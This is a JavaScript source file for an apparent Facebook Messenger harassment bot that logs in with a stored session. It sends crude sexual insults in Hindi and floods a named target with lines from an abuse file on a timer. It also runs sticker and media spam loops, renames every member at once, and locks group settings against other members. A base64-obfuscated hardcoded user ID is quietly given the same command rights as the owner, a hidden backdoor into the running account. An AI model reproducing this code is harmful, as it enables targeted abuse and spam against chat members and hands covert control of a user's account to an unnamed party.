const fs = require("fs");
const login = require("ws3-fca");

let rkbInterval = null;
let stopRequested = false;
const lockedGroupNames = {};
const lockedThemes = {};
const lockedEmojis = {};
let mediaLoopInterval = null;
let lastMedia = null;
let targetUID = null;
let stickerInterval = null;
let stickerLoopActive = false;

const friendUIDs = fs.existsSync("Friend.txt")
  ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const targetUIDs = fs.existsSync("Target.txt")
  ? fs.readFileSync("Target.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;
        const { threadID, senderID, body } = event;
        if (!body) return;
        const lowerBody = body.toLowerCase();

        // ==== Bad word filter ====
        const badNames = ["hannu", "syco"];
        const triggers = ["rkb", "bhen", "maa", "rndi", "chut", "randi", "madhrchodh", "mc", "bc", "didi", "ma"];
        if (badNames.some(n => lowerBody.includes(n)) &&
            triggers.some(w => lowerBody.includes(w)) &&
            !friendUIDs.includes(senderID)) {
          return api.sendMessage(
            "teri ma Rndi hai tu msg mt kr sb chodege teri ma ko byy🙂 ss Lekr story Lga by",
            threadID
          );
        }

        // ==== Only owner + LID ====
        if (![ownerUID, LID].includes(senderID)) return;

        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        // ==== HELP ====
        if (cmd === "/help") {
          const helpText = `
🛠 Available Commands:
- /allname <name>
- /groupname <name>
- /lockgroupname <name>
- /unlockgroupname
- /uid
- /exit
- /rkb <name>
- /stop
- /photo
- /stopphoto
- /sticker<number> (ex: /sticker5)
- /stopsticker
- /target <uid>
- /cleartarget
- /theme <id>
- /locktheme <id>
- /unlocktheme
- /emoji <😀>
- /lockemoji <😀>
- /unlockemoji
          `;
          return api.sendMessage(helpText, threadID);
        }

        // ==== Group Name Commands ====
        if (cmd === "/allname") {
          try {
            const info = await api.getThreadInfo(threadID);
            const members = info.participantIDs;
            api.sendMessage(`🛠  ${members.length} ' nicknames...`, threadID);
            for (const uid of members) {
              try {
                await api.changeNickname(input, threadID, uid);
                console.log(`✅ Nickname changed for UID: ${uid}`);
                await new Promise(res => setTimeout(res, 5000));
              } catch (e) { console.log(`⚠️ Failed for ${uid}:`, e.message); }
            }
            api.sendMessage("ye gribh ka bcha to Rone Lga bkL", threadID);
          } catch { api.sendMessage("badh me kLpauga", threadID); }
        }

        else if (cmd === "/groupname") await api.setTitle(input, threadID);
        else if (cmd === "/lockgroupname") { await api.setTitle(input, threadID); lockedGroupNames[threadID] = input; }
        else if (cmd === "/unlockgroupname") delete lockedGroupNames[threadID];

        else if (cmd === "/uid") api.sendMessage(`🆔 Group ID: ${threadID}`, threadID);
        else if (cmd === "/exit") { try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {} }

        // ==== RKB ====
        else if (cmd === "/rkb") {
          if (!fs.existsSync("np.txt")) return api.sendMessage("konsa gaLi du rkb ko", threadID);
          const name = input.trim();
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          stopRequested = false;
          if (rkbInterval) clearInterval(rkbInterval);
          let index = 0;
          rkbInterval = setInterval(() => {
            if (index >= lines.length || stopRequested) { clearInterval(rkbInterval); rkbInterval = null; return; }
            api.sendMessage(`${name} ${lines[index]}`, threadID);
            index++;
          }, 5000);
          api.sendMessage(`sex hogya bche 🤣rkb ${name}`, threadID);
        }

        else if (cmd === "/stop") { stopRequested = true; if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; } }

        // ==== Media Loop ====
        else if (cmd === "/photo") {
          api.sendMessage("📸 Send a photo or video within 1 minute...", threadID);
          const handleMedia = async (mediaEvent) => {
            if (mediaEvent.type === "message" && mediaEvent.threadID === threadID && mediaEvent.attachments?.length > 0) {
              lastMedia = { attachments: mediaEvent.attachments, threadID: mediaEvent.threadID };
              if (mediaLoopInterval) clearInterval(mediaLoopInterval);
              mediaLoopInterval = setInterval(() => { if (lastMedia) api.sendMessage({ attachment: lastMedia.attachments }, lastMedia.threadID); }, 30000);
              api.removeListener("message", handleMedia);
            }
          };
          api.on("message", handleMedia);
        }

        else if (cmd === "/stopphoto") { if (mediaLoopInterval) { clearInterval(mediaLoopInterval); mediaLoopInterval = null; lastMedia = null; } }

        // ==== Sticker Loop ====
        else if (cmd.startsWith("/sticker")) {
          if (!fs.existsSync("Sticker.txt")) return;
          const delay = parseInt(cmd.replace("/sticker", ""));
          const stickerIDs = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean);
          if (stickerInterval) clearInterval(stickerInterval);
          let i = 0; stickerLoopActive = true;
          stickerInterval = setInterval(() => { if (!stickerLoopActive || i >= stickerIDs.length) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; return; } api.sendMessage({ sticker: stickerIDs[i] }, threadID); i++; }, delay * 1000);
        }

        else if (cmd === "/stopsticker") { if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; } }

        // ==== Target ====
        else if (cmd === "/target") { targetUID = input.trim(); api.sendMessage(`Target set: ${targetUID}`, threadID); }
        else if (cmd === "/cleartarget") { targetUID = null; }

        // ==== Theme Commands ====
        else if (cmd === "/theme") { await api.changeThreadColor(input, threadID); }
        else if (cmd === "/locktheme") { await api.changeThreadColor(input, threadID); lockedThemes[threadID] = input; }
        else if (cmd === "/unlocktheme") delete lockedThemes[threadID];

        // ==== Emoji Commands ====
        else if (cmd === "/emoji") { await api.changeThreadEmoji(input, threadID); }
        else if (cmd === "/lockemoji") { await api.changeThreadEmoji(input, threadID); lockedEmojis[threadID] = input; }
        else if (cmd === "/unlockemoji") delete lockedEmojis[threadID];

        // ==== Event Hooks for Locks ====
        if (event.logMessageType === "log:thread-name" && lockedGroupNames[threadID]) {
          await api.setTitle(lockedGroupNames[threadID], threadID);
        }

        if (event.logMessageType === "log:thread-color" && lockedThemes[threadID]) {
          await api.changeThreadColor(lockedThemes[threadID], threadID);
        }

        if (event.logMessageType === "log:thread-icon" && lockedEmojis[threadID]) {
          await api.changeThreadEmoji(lockedEmojis[threadID], threadID);
        }

      } catch (e) { console.error("⚠️ Error:", e.message); }
    });
  });
}

module.exports = { startBot };
